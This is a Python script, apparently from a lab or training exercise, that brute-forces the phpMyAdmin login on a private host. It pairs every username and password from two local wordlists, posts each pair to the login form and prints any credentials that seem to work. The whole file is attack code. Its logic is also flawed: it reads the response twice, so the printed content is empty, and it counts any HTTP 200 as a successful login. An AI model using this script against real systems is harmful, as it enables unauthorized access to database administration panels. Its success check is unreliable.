import http.client

username_file = '/Users/federicocattani/Desktop/brute/usernames.txt'
password_file = '/Users/federicocattani/Desktop/brute/passwords.txt'

conn = http.client.HTTPConnection('192.168.50.101')

with open(username_file, 'r') as usernames:
    for username in usernames:
        username = username.strip()
        with open(password_file, 'r') as passwords:
            for password in passwords:
                password = password.strip()
                
                payload = 'pma_username=' + username + '&pma_password=' + password

                headers = {'Content-Type': 'application/x-www-form-urlencoded'}

                conn.request('POST', '/phpMyAdmin/', body=payload, headers=headers)

                try:
                    response = conn.getresponse()
                    response.read()
                    response_content = response.read().decode('utf-8')
                    
                    print('risposta:', response_content)
                    print('Stato:', response)
                    
                    if response.status == 200:
                        print('Login riuscito')
                        print('Username:', username)
                        print('Password:', password)
                        conn.close()
                        exit()

                    elif response.status != 200:
                        new_location = response.getheader('Location')
                        print('Login non riuscito')
                        print('Nuova posizione:', new_location)
                        print('Username:', username)
                        print('Password:', password)
                
                except http.client.HTTPException as e:
                    print('Errore durante la richiesta HTTP:', str(e))
                    conn.close()
                    exit()

print('Login non riuscito')
conn.close()
